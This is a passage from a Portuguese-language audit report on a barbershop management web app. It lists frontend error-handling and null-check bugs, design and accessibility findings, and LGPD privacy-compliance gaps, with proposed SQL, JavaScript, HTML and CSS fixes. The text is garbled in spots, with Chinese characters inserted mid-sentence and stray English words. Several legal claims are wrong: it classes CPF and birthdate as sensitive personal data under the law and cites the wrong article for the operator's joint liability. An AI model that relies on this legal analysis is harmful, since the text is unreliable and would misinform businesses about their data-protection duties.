`staff/{agenda,venda,produtos,finance}.html` e `client/home.html` fazem `catch (err) { console.error("Erro:", err); }` — **o usuário não vê nada** e a tela fica vazia ou congelada. Comparado com `staff-app.js:413-417` e `staff/clients.html:383-385`, que fazem certo.

E 8 telas mandam `<tbody>` **vazio** — sem spinner, sem esqueleto, sem "Carregando…".

### [P3-12] 🟡 Checks de `null` faltando → risco de crash

| Arquivo:linha | Código | Risco |
|---|---|---|
| `staff-app.js:161-165` | `app.classList.toggle(...)` | `app` pode ser `null` — o `hamburgerButton` é checado (`:158`), o `app` **não** |
| `staff-app.js:328-332` | `form.elements.name.value` | coupling silencioso entre id do HTML e JS |
| `client/home.html:584` | `document.getElementById("welcome-title").textContent` | sem null check |
| `client/home.html:628` | `app.appointment_time.substring(0, 5)` | **`TypeError`** se `appointment_time` for `null` — derruba o render |
| `js/register.js:34` | `registerMessage.textContent` | sem null check (o `auth-manager.js:65` **tem**) |
| `staff/agenda.html:748,767` | `dateInput.value`, `getElementById("filter-staff").value` | sem null check |

```js
function requiredElement(id) {
  const el = document.getElementById(id);
  if (!el) throw new Error(`[UI] Elemento obrigatório #${id} não encontrado`);
  return el;
}
```

### [P3-13] 🟡 4 telas "fingem" funcionar

`public/staff/appointments.html` (70 linhas) e `public/staff/settings.html` (40 linhas) são **stubs não linkados em lugar nenhum**, com `<aside class="sidebar" id="sidebar"></aside>` **vazio** (nada popula), mock data hardcoded e — no caso de `appointments.html` — 5 inputs **sem label** e IDs de formulário que colidem com `agenda.html` (`#appointment-form`), fazendo o `staff-app.js` anexar o `alert()` falso (§P2-06).

`public/staff/novocliente.html:192` tem um botão "Cancelar" com `type="button"` e **nenhum handler** — não faz nada.

**Correção:** delete `staff/appointments.html` e `staff/settings.html`.

### [P3-14] 🟡 Falta de null-checks e `?` em cadeia no `clients-page.js`

**Arquivo:** `public/js/staff/clients-page.js:19-21,48,122-123` — o `tbody` é verificado ✅, mas `searchInput.value`, `statusFilter.value` e `message.textContent` são desreferenciados **sem guarda**.

### [P3-15] 🟢 O que está bem feito em código

- **Zero `eval` / `new Function` / `document.write` / `insertAdjacentHTML` / `outerHTML` / `setTimeout` com string** em todo o frontend — raro e louvável num projeto vanilla de 23 páginas.
- **`clients-page.js` é a implementação-modelo** do repositório: DOM via `createElement` + `textContent`, `replaceChildren` em vez de `innerHTML = ""`, estado vazio distinto de "sem resultados para este filtro", e **documenta o próprio rationale de segurança** no cabeçalho. Adote-a.
- **`staff/barbeiros.html` é o exemplar de acessibilidade**: os 5 inputs têm `autocomplete` (`name`/`email`/`tel`/`new-password`/`new-password`), `minlength`/`maxlength`, `<label for>` e o campo opcional é marcado `(opcional)` com `aria-hidden` no asterisco.
- **`staff/services.html` é a melhor tela de staff**: `<label for>` nos 7 controles, `scope="col"` nos `<th>`, `<span class="sr-only">Ações</span>`, `aria-label` em todo botão de ícone, `aria-hidden="true"` nos `<i>` decorativos, `inputmode`/`min`/`max`/`step` nos numéricos, esqueleto de loading e região de erro visível.
- **`shared.js` centraliza a sessão corretamente** — `clearSession()` é **exatamente simétrico** com `saveSession()` (as 5 chaves).
- **`authenticatedFetch()` tem o design certo** — header centralizado, 401 → refresh → retry, `null` sinalizando "sessão expirada, já redirecionei" — e todos os chamadores tratam com `if (!response) return;`. Falta a trava de execução única (P0-03).
- **`auth-manager.js:115-145`** — o login unificado existe deliberadamente para *não* consumir 3× o rate limit, e o comentário explica isso. Decisão bem pensada.
- **Tratamento de erro consistente em `staff-app.js`**: `try/catch` em todo handler, botão desabilitado durante a requisição, restaurado no `finally`, mensagem **visível** ao usuário (`setServiceFormMessage`/`setBarberFormMessage`), distinção sucesso/erro por classe. O `finally` sempre restaura o botão — bug comum que este código evita.
- **`staff/clients.html:383-385`** — a única página que mostra erro visível ao usuário no `catch` de fetch.
- **`server.js:466-471` + `server.js:487`** — rotação de refresh token com rastreio de sessão no servidor é um controle de backend bem desenhado. O bug (P0-03) é 100% do lado do cliente.

---

## 🎨 6. Design, UI/UX, acessibilidade e LGPD

### 6.1 [D-01] 🔴 A landing falha em 14 checks automáticos do inspetor

```
$ node taste-skill/scripts/inspect.mjs public/index.html
RESULT: 14 FAIL, 8 WARN — fix every FAIL
```

| # | Regra violada | Onde | Correção |
|---|---|---|---|
| 1 | **Headline com 4 linhas** | `index.html:63-65` — "Gestão inteligente / para sua barbearia" quebra em 4 linhas a 1440 px | Corte para ≤ 32 caracteres (ver §8). |
| 2 | **Headline com 4 linhas** | `index.html:233` — "Construído para elevar o padrão da sua barbearia" | "Sua barbearia, no padrão certo." |
| 3 | **Eyebrow ×3** | `index.html:167, 233, 292` | Remova — a informação vai no título ou não é necessária. |
| 4 | **Gradientes** | `styles-landing.css` (`hero-overlay`, `feature-highlight-card.gold`) | Overlay sobre foto é a exceção permitida; o do card dourado, não. |
| 5 | **Sombras em repouso** | `styles.css` (cards e `.quick-item`) | Separe por tom de superfície. |
| 6 | **Gradiente no texto** | "dourado" no hero | Use um token `--accent` sólido. |
| 7 | **Micro-labels em caixa-alta** | "ATENDIMENTOS HOJE", "FATURAMENTO HOJE", "AGENDAMENTOS", "TICKET MÉDIO" | Sentence case, 13–14 px. |
| 8 | **Grid de cards idênticos** | `.benefit-card` ×3 | Varia a composição por seção. |
| 9 | **Regra fina (hairline)** | bordas de tabela e `.app-frame` | Espaço ou tom de superfície. |
| 10 | **Gradiente de botão** | `.btn-primary` | Um preenchimento sólido. |
| 11 | **Focus invisível** | `styles.css` | `outline: 2px solid var(--gold); outline-offset: 2px`. |
| 12 | **`transition: all`** | `styles.css:1477`, `styles-landing.css:560` | Transicione só `transform`, `opacity`, `background-color`. |
| 13 | **Sem `prefers-reduced-motion`** | — | Bloco global (abaixo). |
| 14 | **Fonte padrão declarada** | `index.html:26` | `font-display: swap` + fallback com métricas similares. |

**Correção estrutural (foco + movimento):**

```css
/* public/styles.css — no topo, global */
:root {
  --focus-ring: 2px solid var(--gold, #c9a227);
  --focus-offset: 2px;
}

:where(a, button, input, select, textarea, [tabindex]):focus-visible {
  outline: var(--focus-ring);
  outline-offset: var(--focus-offset);
  border-radius: 2px;
}

@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}
```

> Hoje existe **1 única ocorrência** de `prefers-reduced-motion` em todo o repositório — e **nenhuma** regra de foco visível consistente. Ambos são requisitos da WCAG 2.1 (2.4.7 Focus Visible / 2.3.3 Animation from Interactions).

**Medições do inspetor na landing (1440 px):** 385 palavras, 3 imagens, 16 tamanhos de fonte distintos (9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 26, 48, 72 px), body a 15,2 px/1,7, texto corrido em cinza a 5,7:1, contraste de "Tecnologia de Ponta" a 2,6:1 e "Arquitetura Multi-Perfil" a 2,8:1 (abaixo de 4,5:1), e apenas 7 elementos animados no carregamento + scroll.

### 6.2 [D-02] 🟠 Tokens de design duplicados e **conflitantes** em 4 `:root`

**Arquivos:** `public/styles.css:11-18` · `public/styles-landing.css:4-38` · `public/styles-auth.css:4-30` · `public/styles-legacy.css:4-16`

| Token | `styles.css` | `styles-landing.css` | `styles-auth.css` | `styles-legacy.css` | Conflita? |
|---|---|---|---|---|---|
| `--green` | `#1F4B3F` | `#15372C` | `#15372C` | `#15372C` | ⚠️ 2 valores |
| `--gold` | `#C9A227` | `#D4AF37` | `#D4AF37` | `#D4AF37` | ⚠️ 2 valores |
| `--bg` / `--surface` | `#F7F8FA` | `#0E1116` | `#0E1116` | `#0E1116` | ⚠️ 2 valores |
| `--radius` | `10px` | `14px` | `14px` | `14px` | ⚠️ 2 valores |

Cada página carrega **seu próprio** CSS com **seu próprio** `:root`. O verde do dashboard e o verde da landing **não são o mesmo verde**; o ouro do botão de login **não é o mesmo ouro** do botão da landing. É por isso que o sistema "parece" coerente na primeira olhada e quebra quando você compara telas.

**Correção — um único arquivo de tokens** (ver §6.3 para o conteúdo completo): `public/styles/tokens.css`, carregado por todas as páginas.

### 6.3 [D-03] 🟠 Três tipografias em vez de duas

| Fonte | Onde | Problema |
|---|---|---|
| `DM Sans` | `index.html`, `login.html`, `cadastro.html`, 4 telas de cliente, 6 telas de staff | **Nunca carrega** (P0-04) |
| `Inter` | `styles.css` (via `@import` no CSS) | Carrega, mas é uma terceira família que ninguém pediu |
| `Playfair Display` | display/títulos | Correta e bem escolhida |

**Decisão recomendada:** **Playfair Display** (display) + **DM Sans** (texto, com a URL corrigida) — a identidade atual já é sólida. Ou, se quiser o eixo "barbearia premium" sugerido pelo `ui-ux-pro-max`: **Cormorant + Montserrat**. Não troque sem motivo; **simplifique**.

E **não use `@import` de fonte dentro do CSS** — ele bloqueia o render e é a 3ª requisição em cascata. Mova para `<link>` no HTML ou, melhor, **self-host** (§6.5).

### 6.4 [D-04] 🟠 301 px de overflow horizontal no dashboard mobile

**Confirmado em runtime** (Chromium, 390 × 844):

```
document.documentElement.scrollWidth = 691
document.documentElement.clientWidth = 390
→ overflow horizontal = 301 px
```

Causa raiz — `public/styles.css:2160-2169`:

```css
@media (max-width: 768px) {
  .linechart { height: auto; min-height: 250px; overflow-x: auto; }
  .dashboard-chart { min-width: 620px; height: 270px; }   /* ← 620px numa coluna de 248px */
}
```

O `min-width: 620px` do SVG dentro de um contêiner de 248 px cria um vão de 372 px; o `overflow-x: auto` do pai não contém o vazamento porque o `body { overflow-x: hidden }` (`styles.css:27`) corta a página em vez de resolver o layout.

**Correção — o gráfico deve ser fluido:**

```css
@media (max-width: 768px) {
  .linechart { height: auto; min-height: 200px; overflow: hidden; }
  .dashboard-chart { min-width: 0; width: 100%; height: auto; aspect-ratio: 760 / 300; }
}
```

```html
<svg class="svg-chart dashboard-chart" viewBox="0 0 760 300"
     preserveAspectRatio="xMidYMid meet" role="img" aria-label="Faturamento semanal">
```

### 6.5 [D-05] 🔴 Conformidade LGPD — Lei 13.709/2018

#### 6.5.1 Papéis (art. 5, V–VII) — o modelo que o produto assume

| Papel | Quem é | Obrigações |
|---|---|---|
| **Titular** (art. 5, V) | O cliente da barbearia | rights do art. 18 |
| **Controladora** (art. 5, VI) | A barbearia (dono) | art. 6, 7, 9, 37, 41, 46, 48 |
| **Operadora** (art. 5, VII) | **Barber-Select** | art. 39 (instruções documentadas do controlador) |

**Esse enquadramento é o ponto de partida de tudo.** O Barber-Select **não é** a controladora dos dados dos clientes da barbearia — é a **operadora**. Consequências que o repositório não cumpre:

- **Art. 39, II e V:** precisa de contrato (SLA/DPA) com a controladora definindo as **instruções documentadas** para o tratamento, inclusive a devolução ou eliminação dos dados ao término do contrato (art. 39, V).
- **Art. 18, §4:** a operadora responde **solidariamente** com a controladora por danos causados — o que torna os itens de segurança abaixo ainda mais graves para o Barber-Select.
- **Art. 41 + Resolução CD/ANPD nº 18/2024:** a controladora precisa indicar **encarregado**; a operadora também precisa de um (ou学着 de um encarregado dedicado).

#### 6.5.2 Diagnóstico por artigo

| Artigo | Exigência | Estado | Evidência |
|---|---|---|---|
| **Art. 9** | Aviso de Privacy / Política de Privacidade | 🔴 **AUSENTE** | `grep -riE 'privacidade\|lgpd\|encarregado'` → **zero** resultados. Os links "Política de Privacidade" e "Termos de uso" são `href="#"` (mortos) em `public/pages/cadastro.html:187-188` e `public/index.html:345-346`. |
| **Art. 41** | Encarregado (DPO) nomeado e público | 🔴 **AUSENTE** | Nenhum arquivo, nenhuma referência, nenhum canal de contato. |
| **Art. 7 / Art. 11** | Base legal **por finalidade** | 🔴 **INEXISTENTE** | Nenhum campo de finalidade no schema. Ver §6.5.3. |
| **Art. 8, §5 / Art. 11, I** | Consentimento destacado, específico, granular e revogável | 🔴 **INEXISTENTE** | `cadastro.html:184-185` tem um checkbox único que diz *"Concordo com os Termos de uso e a Política de Privacidade"*. Termos de uso **não é base legal**; o consentimento não é destacado, não é granular por finalidade e não tem revogação facilitada. |
| **Art. 7, VI / Art. 6** | Finalidade, necessidade e minimização | 🔴 **VIOLADO** | Uma única tabela `clients` guarda, sem separação: CPF, data de nascimento, observações de pele, tipo de cabelo, tipo de barba, barbeiro favorito e pontos de fidelidade. `GET /api/clients` (`clients-routes.js:91`) devolve **CPF, birthdate e skin_notes em claro para até 500 clientes** a qualquer `staff`. |
| **Art. 5, II / Art. 11** | Dados sensíveis | 🔴 **TRATADOS SEM BASE** | `cpf` (documento de identificação), `birthdate` e `skin_notes` (pode conter dado de saúde) são **dados pessoais sensíveis**. Para dados sensíveis **não cabe legítimo interesse** (art. 11, §2) — só consentimento, obrigação legal ou exercício regular de direitos. |
| **Art. 18, I–II** | Confirmação e acesso | ✅ **Implementado** | `GET /api/clients/me` (`clients-routes.js:114`) |
| **Art. 18, III** | Correção | ✅ **Implementado** | `PUT /api/clients/me` (`clients-routes.js:137`) — mas **quebra em MySQL real** (P0-05) |
| **Art. 18, IV + Art. 18-A** | Portabilidade | 🟡 **Parcial** | `GET /api/clients/me/export` existe (`clients-routes.js:181`), mas: (a) **não há UI de download** — `grep 'export\|download\|Baixar'` em `public/client/profile.html` → **vazio**; (b) o JSON não segue a estrutura do art. 18-A, II; (c) quebra em MySQL real (P0-05). |
| **Art. 18, V** | Informação sobre compartilhamentos | 🔴 **AUSENTE** | Nenhuma tela informa com quem os dados são compartilhados. |
| **Art. 18, VI** | Eliminação | 🟡 **Parcial** | `DELETE /api/clients/me` anonimiza **só** `clients`. `appointments` (`client_name`, `client_phone`), `sales` (`client_name`) e `transactions` (descrição) mantêm a PII (P1-07). `fav_barber`, `hair_style`, `beard_style` e `password_hash` permanecem. |
| **Art. 8, §5** | Revogação do consentimento | 🔴 **AUSENTE** | Nenhum fluxo. |
| **Art. 18, §1** | Petição à ANPD / aos órgãos de defesa | 🔴 **AUSENTE** | Não há orientação ao titular. |
| **Art. 20** | Decisões automatizadas | 🟡 **Risco** | `loyalty_points` (DEFAULT 12, **sem regra de cálculo** no repositório) decide elegibilidade ao cupom `BARBER15OFF`. É decisão automatizada com efeito sobre o titular → exige **transparência**. |
| **Art. 37** | Registro das operações de tratamento | 🔴 **AUSENTE** | `grep -riE 'audit\|auditoria'` → **zero** resultados. Um `staff` acessando o CPF de um cliente **não gera rastro algum**. Isso é crítico: sem log, a controladora não consegue responder a uma requisição do titular nem da ANPD. |
| **Art. 46** | Medidas de segurança | 🟡 **Parcial** | ✅ bcrypt, helmet, rate limit, prepared statements. ❌ Senha do `.env` em texto puro, credenciais de seed no repositório, sessões em memória sem revogação real, **exposição excessiva de CPF**, sem plano de incidente. |
| **Art. 48 + Res. CD/ANPD nº 15/2024** | Comunicação de incidente de segurança | 🔴 **AUSENTE** | Sem processo, sem registro de incidente, sem prazo de 3 dias úteis monitorado. |
| **Art. 33 + Res. CD/ANPD nº 19/2024** | Transferência internacional | 🔴 **VIOLADO** | Ver §6.5.4. |
| **Art. 14** | Crianças e adolescentes | 🟡 **Risco** | `birthdate` é coletado mas **não usado para bloqueio**. Barbershops atendem menores; o art. 14, §1 exige consentimento **específico e em destaque** de um responsável. |
| **Art. 39** | Operadora — instruções documentadas | 🔴 **AUSENTE** | Sem contrato/termos SaaS no repositório. |
| **Art. 6, III / Art. 15** | Transparência e tratamento de dados para finalidades legítimas | 🟡 **Parcial** | O banner do dashboard cita LGPD no texto do modal de exclusão, mas o produto não tem aviso de privacidade. |

#### 6.5.3 Dados sensíveis e a necessidade de base legal separada

O schema da tabela `clients` (`features/cadastro-mysql/schema.sql` + as colunas de `clients-routes.js:15-23`) consolida **três finalidades distintas** num só registro:

| Dado | Sensível? | Finalidade real | Base legal aplicável |
|---|---|---|---|
| `name`, `email`, `phone` | Não | Contato e identificação | Execução de contrato (art. 7, V) |
| `password_hash` | Não (dado de segurança) | Autenticação | Legítimo interesse / proteção ao titular (art. 7, X) |
| `birthdate` | **Sim** (art. 5, II — identificação) | Ficheiro do cliente | **Consentimento (art. 11, I)** ou obrigação legal (obrigações fiscais/trabalhistas) |
| `cpf` | **Sim** (art. 5, II — documento) | Emissão de nota fiscal / cadastro | **Obrigação legal** (obrigação fiscal) — o que é um argumento **fortalecido** para coletar CPF |
| `skin_notes` | **Sim** (pode revelar condição de saúde) | Histórico de atendimento | **Consentimento (art. 11, I)** — e com cuidado de minimização |
| `hair_style`, `beard_style` | Não | Preferência de serviço | Execução de contrato |
| `fav_barber` | Não | Preferência | Execução de contrato |
| `loyalty_points` | Não | Fidelidade | Execução de contrato / consentimento para marketing |

**Correção estrutural — separar por finalidade (art. 6, I, e art. 7, VI):**

```sql
-- Tabela de perfil: dados necessários ao atendimento
CREATE TABLE client_profiles (
  client_id INT PRIMARY KEY,
  hair_style VARCHAR(100) NULL,
  beard_style VARCHAR(100) NULL,
  fav_barber VARCHAR(50) NULL,
  skin_notes VARCHAR(300) NULL,        -- sensível: base legal = consentimento
  skin_notes_consent_at DATETIME NULL,  -- ← prova do consentimento (art. 8, §2)
  skin_notes_consent_revoked_at DATETIME NULL
);

-- Tabela de identificação: base legal = obrigação legal
CREATE TABLE client_documents (
  client_id INT PRIMARY KEY,
  cpf CHAR(11) NULL,
  birthdate DATE NULL
);

-- Consentimentos versionados (art. 8, §2: consentimento deve ser demonstrate)
CREATE TABLE consents (
  id INT AUTO_INCREMENT PRIMARY KEY,
  client_id INT NOT NULL,
  purpose VARCHAR(60) NOT NULL,        -- 'skin_notes', 'marketing', 'fidelity'
  granted TINYINT(1) NOT NULL,
  granted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  revoked_at TIMESTAMP NULL,
  ip VARCHAR(45) NULL,
  user_agent VARCHAR(255) NULL,
  INDEX idx_consents_client (client_id, purpose)
);
```

E o checkbox único do cadastro vira **consentimentos granulares e destacados**:

```html
<fieldset class="consent-box">
  <legend>Permissões de tratamento de dados</legend>

  <label class="consent-item">
    <input type="checkbox" name="consent_skin_notes" required />
    <span>
      <b>Autorizo o registro de observações sobre a minha pele e preferências de corte.</b>
      <small>Dados sensíveis, usados apenas para personalizar o atendimento. Posso revogar a qualquer momento na aba Configurações.</small>
    </span>
  </label>

  <label class="consent-item">
    <input type="checkbox" name="consent_marketing" />
    <span>
      <b>Quero receber novidades e promoções da barbearia.</b>
      <small>Opcional. Sem este consentimento você continua recebendo apenas avisos de agendamento.</small>
    </span>
  </label>
</fieldset>
```

#### 6.5.4 🔴 Transferência internacional via CDN de terceiros

**Confirmado em runtime** (contagem de arquivos):

```
21 arquivos usam CDN de terceiros:
  20 × https://unpkg.com/boxicons          (BoxIcons)
  13 × https://fonts.googleapis.com/css2   (Google Fonts)
  12 × https://fonts.gstatic.com           (Google Fonts)
```

Cada requisição a esses hosts transmite o **IP do usuário** — que é **dado pessoal** (art. 5, I) — a servidores nos **Estados Unidos**. Isso é **transferência internacional** (art. 33) sem mecanismo válido: não há consentimento, não há cláusulas-padrão contratuais (Res. CD/ANPD nº 19/2024), não há avaliação de adequação. A prática do CDN de web fonts do Google foi objeto de questionamento na ANPD e em órgãos de defesa do consumidor no Brasil.

**Correção — self-host. Elimina o problema e ainda corrige o bug da tipografia:**

```
public/
  fonts/
    dm-sans-latin.woff2        (400, 500, 700 — variável)
    playfair-display-latin.woff2
  icons/
    boxicons.woff2  +  boxicons.css
```

```css
/* public/styles/fonts.css */
@font-face {
  font-family: "DM Sans";
  src: url("/fonts/dm-sans-latin.woff2") format("woff2");
  font-weight: 100 1000;
  font-style: normal;
  font-display: swap;
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

@font-face {
  font-family: "Playfair Display";
  src: url("/fonts/playfair-display-latin.woff2") format("woff2");
  font-weight: 400 900;
  font-style: normal;
  font-display: swap;
}
```

**Ganhos:** (a) LGPD resolvido; (b) o bug da DM Sans resolvido junto; (c) LCP melhor (sem 3ª requisição em cascata); (d) o app funciona offline; (e) nenhuma requisição a terceiro.

> **Alternativa pragmática (se não quiser self-host agora):** migre o BoxIcons para **SVG inline** (ele já é usado como `<i class="bx bx-...">` — 60+ usos, mas o *set* de ícones é pequeno e estável) e sirva as fontes localmente. Manter a fonte no CDN e só self-hostar os ícones resolve 90% do risco.

#### 6.5.5 🔴 Registro de operações (art. 37) — a lacuna mais crítica

Sem log de auditoria, **ninguém** consegue responder a uma requisição do titular ("quem accessed meu CPF?") ou da ANPD. E, para a controladora, é requisito de conformidade.

```js
// features/shared/audit.js
async function audit(pool, { actor, actorRole, action, resourceType, resourceId, legalBasis, request }) {
  await pool.query(
    `INSERT INTO access_audit
       (actor_id, actor_role, action, resource_type, resource_id, legal_basis, ip, user_agent, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, NOW())`,
    [actor?.userId ?? null, actor?.role ?? "anonymous", action, resourceType,
     resourceId ?? null, legalBasis ?? null, request?.ip ?? null, request?.get?.("user-agent") ?? null]
  );
}
```

```sql
CREATE TABLE access_audit (
  id BIGINT AUTO_INCREMENT PRIMARY KEY,
  actor_id VARCHAR(64) NULL,
  actor_role ENUM('client','staff','admin','anonymous') NOT NULL,
  action VARCHAR(60) NOT NULL,          -- 'read', 'create', 'update', 'delete', 'export', 'anonymize'
  resource_type VARCHAR(40) NOT NULL,   -- 'client', 'appointment', 'sale', 'transaction'
  resource_id VARCHAR(64) NULL,
  legal_basis VARCHAR(40) NULL,         -- 'contrato', 'consentimento', 'obrigacao_legal'
  ip VARCHAR(45) NULL,
  user_agent VARCHAR(255) NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_audit_resource (resource_type, resource_id, created_at),
  INDEX idx_audit_actor (actor_id, created_at)
);
```

E chame nos pontos de leitura de dado sensível:

```js
// features/clientes-mysql/clients-routes.js — GET /api/clients
await audit(pool, {
  actor: req.user, action: "read", resourceType: "client", legalBasis: "contrato", request: req,
});
```

**Enquanto isso, reduza a exposição:** `GET /api/clients` não precisa devolver `cpf`, `birthdate` e `skin_notes` para listar 500 clientes. Mascare:

```js
function toListApi(row) {
  return {
    id: row.id,
    name: row.name,
    email: row.email,
    phone: row.phone,
    cpf: row.cpf ? `***.***.${row.cpf.slice(-3)}-${row.cpf.slice(-2)}` : null,   // art. 46 minimização
    active: Boolean(row.active),
    createdAt: row.created_at,
  };
}
```

E mantenha o CPF completo **apenas** no endpoint de detalhe, com log de auditoria.

#### 6.5.6 🔴 Aviso de Privacy e Termos — modelo pronto

**Arquivo novo:** `public/pages/privacidade.html` (e `public/pages/termos.html`), referenciados pelos `href="#"` existentes.

Conteúdo mínimo do **Aviso de Privacidade** (art. 9):

1. **Identificação do controlador e do operador** — razão social, CNPJ, endereço, e-mail de contato e **canal do encarregado (DPO)**.
2. **Categorias de dados tratados** — a tabela da §6.5.3, com a **base legal** de cada um.
3. **Finalidades** — por finalidade, com o art. 6, I.
4. **Compartilhamentos** — quem recebe, com qual fundamento. Inclua: **Google (CDN de fontes/ícones)** enquanto isso existir — ou declare explicitamente que o app é *self-hosted* e não transmite IP a terceiros.
5. **Transferência internacional** — "não.transferimos dados para fora do Brasil" **só depois** de implementar o self-host.
6. **Retenção** — por categoria (ver §6.5.7).
7. **Direitos do titular** — como exercer cada um, **endereço de e-mail**, e a menção ao art. 18, §1 (petição à ANPD).
8. **Medidas de segurança** — art. 46.
9. **Alterações desta política** — como o titular é avisado.

**No cadastro**, o checkbox deve apontar para essas páginas reais (`href="privacidade.html"`), e o texto deve dizer que é **consentimento** para as finalidades sensíveis, não aceitação de termos.

#### 6.5.7 🟡 Política de retenção (art. 15, §2)

Não há nenhuma política de retenção. Sugestão inicial (ajustar por barbearia, com aviso):

| Dado | Retenção | Justificativa |
|---|---|---|
| `appointments`, `sales`, `transactions` | 5 anos | Prescrição de obrigações fiscais e trabalhistas |
| `cpf`, `birthdate` | Enquanto houver relação + 5 anos | Obrigação fiscal |
| `skin_notes` | Enquanto houver relação | Finalidade de atendimento; revogável a qualquer momento |
| `clients` inativos | 2 anos após a última atividade | Finalidade + segurança |
| Logs de acesso (art. 37) | 5 anos | Obrigação de accountability |

Implemente uma rotina de expiração (`DELETE`/anonimização por job agendado) e registre-a no aviso.

#### 6.5.8 ✅ O que já está pronto para LGPD

Vale registrar — o trabalho de base **existe**:

- **Exportação de dados** (art. 18, IV): `GET /api/clients/me/export` — endpoint real, com `delete clientData.password_hash` para nunca exportar hash.
- **Anonimização** (art. 18, VI): `DELETE /api/clients/me` — endpoint real, com mensagem citando a LGPD.
- **Validação de CPF** (`clients-routes.js:59-78`) com verificação dos dois dígitos verificadores e rejeição de sequências repetidas — qualidade de dado acima da média.
- **Coleta mínima no cadastro**: `POST /api/register` (`client-auth.js`) aceita **apenas** `name`, `email`, `phone`, `password` — CPF, data de nascimento e notas de pele **não** são coletados no cadastro público. ✅
- **Prevenção de enumeração** no cadastro (mesma lógica da §3).
- **Separação entre tabela de equipe e tabela de clientes** (`staff_users` × `clients`), com verificação de e-mail duplicado entre as duas (`staff-auth.js:203-207`) — boa hygiene de identidade.
- **`MAX_CLIENTS = 500`** (`clients-routes.js:5`) — limite de volume, bom para minimização.

---

### 6.6 [D-06] 🟠 Acessibilidade: `<h1>` duplicado, labels ausentes, `alt` redundante

**Confirmado em runtime:**

| Página | Achado |
|---|---|
| `public/pages/login.html` | **2 elementos `<h1>`** — "Gestão inteligente para sua barbearia" e o título do formulário. |
| `public/pages/cadastro.html` | **2 `<h1>`** (mesmo padrão). |
| `public/staff/novocliente.html` | **2 `<h1>`** ("Novo Cliente" duas vezes). |
| `public/staff/novagendamento.html` | **3 `<h1>`** — inclui `<h1>R$ 45,00</h1>`, um preço renderizado como heading de topo. |
| `public/pages/login.html:142` | `<input type="checkbox" id="remember-me" />` **sem `<label for="remember-me">`**. |
| `public/staff/{appointments,novocliente,configuracoes}.html` | **5–6 labels sem `for`** e inputs sem `id` — nenhum controle é programaticamente rotulado. |
| `public/staff/novagendamento.html:161,171,183,188` | `for=""` e `id=""` — **4 IDs vazios** (duplicados) e 4 labels que não apontam para nada. |
| `public/client/settings.html:431,443` | 2 `<select>` **sem label** (o texto ao lado é `<b>`/`<span>`, que não são labels). |
| `public/staff/dashboard.html:546` | `<svg role="img" aria-label="Faturamento semanal">` ✅, mas os dados **só existem no SVG** — sem tabela alternativa (WCAG 1.3.1). |
| `public/pages/login.html:136` | Toggle de senha como `<i role="button">` **sem `tabindex="0"`** → inalcançável por teclado. |
| `public/pages/cadastro.html:161,178` | Toggle de senha como `<i>` **sem `role` e sem `aria-label`** → completamente inacessível. |
| `public/index.html` | `<img src="assets/LOGO.png" alt="Barber-Select Logo">` **seguido do wordmark textual** → leitor de tela anuncia "Barber-Select Logo, Barber, Select". Use `alt=""`. |

**Correções:**

```html
<!-- 1. Um h1 por página -->
<div class="auth-hero-heading">Gestão inteligente para sua barbearia</div>   <!-- em vez de <h1> -->

<!-- 2. Checkbox com label -->
<label for="remember-me">
  <input type="checkbox" id="remember-me" name="remember" />
  <span>Lembrar de mim</span>
</label>

<!-- 3. Toggle de senha como botão de verdade -->
<button type="button" class="eye-icon" id="toggle-password"
        aria-label="Mostrar senha" aria-pressed="false">
  <i class="bx bx-show" aria-hidden="true"></i>
</button>

<!-- 4. Select com label -->
<label class="sr-only" for="pref-theme">Tema do aplicativo</label>
<select id="pref-theme">...</select>

<!-- 5. Alternativa textual para o gráfico (WCAG 1.3.1) -->
<table class="visually-hidden">
  <caption>Faturamento semanal por dia</caption>
  <thead><tr><th>Dia</th><th>Faturamento</th></tr></thead>
  <tbody><tr><td>Segunda</td><td>R$ 1.840,00</td></tr>...</tbody>
</table>
```

```css
.visually-hidden {
  position: absolute; width: 1px; height: 1px;
  padding: 0; margin: -1px; overflow: hidden;
  clip: rect(0 0 0 0); white-space: nowrap; border: 0;
}
```

### 6.7 [D-07] 🟡 Micro-labels em caixa-alta com `letter-spacing` — anti-pattern de IA

Encontrado em **todas** as telas de staff e cliente:

```html
<span class="stat-label">ATENDIMENTOS HOJE</span>
<span class="eyebrow">ARQUITETURA MULTI-PERFIL</span>
```

O `taste-skill` mediu: sites de galeria com score ≥ 7,5 usam *micro-labels em caixa-alta espaçada* em apenas **16%** dos casos, contra **57%** dos sites com score < 6,5. É um dos "tells" mais fortes de página gerada por IA.

```css
.stat-label {
  font-size: var(--text-sm);        /* 14px */
  letter-spacing: 0;
  text-transform: none;
  color: var(--text-secondary);
  font-weight: 500;
}
```

### 6.8 [D-08] 🟡 Números do dashboard contradizem o mock da landing

A landing mostra: `Faturamento Hoje R$ 1.840,00 +18%` e `Agendamentos 24 Atendimentos`.
O dashboard real mostra: `ATENDIMENTOS HOJE 18`, `AGENDAMENTOS 24`, `FATURAMENTO HOJE R$ 1.840`, `TICKET MÉDIO R$ 76,60`.

- "Atendimentos hoje 18" vs "Agendamentos 24" — dois KPIs com nomes parecidos, o usuário não sabe qual é qual.
- `R$ 1.840` (dashboard) vs `R$ 1.840,00` (landing) — formatação monetária inconsistente.
- `24 Atendimentos` (landing) vs `24 Agendamentos` (dashboard) — o mesmo número, nome diferente.

```js
// public/js/shared/format.js
const BRL = new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL" });
const money = (value) => BRL.format(Number(value) || 0);              // "R$ 1.840,00"
const integer = (value) => new Intl.NumberFormat("pt-BR").format(value);  // "24"
```

### 6.9 [D-09] 🟡 `100vh` em mobile e tabelas sem wrapper de scroll

```
$ grep -n '100vh' public/client/*.html
→ 2 ocorrências  (use 100dvh / 100svh)
```

